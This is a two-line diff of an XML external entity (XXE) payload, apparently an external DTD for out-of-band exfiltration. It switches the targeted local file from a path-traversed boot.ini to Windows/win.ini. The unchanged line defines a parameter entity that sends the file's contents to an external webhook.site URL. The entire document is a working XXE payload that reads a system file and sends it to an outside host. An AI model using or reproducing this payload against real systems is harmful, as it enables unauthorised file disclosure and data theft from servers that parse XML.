@@ -1,2 +1,2 @@
-<!ENTITY % payl SYSTEM "file:///../../../../../../../boot.ini">
+<!ENTITY % payl SYSTEM "file:///Windows/win.ini">
 <!ENTITY % int "<!ENTITY &#x25; trick SYSTEM 'https://webhook.site/e8ebcbd7-e113-4057-a38b-7750b9fae4cb/?%payl;'>">
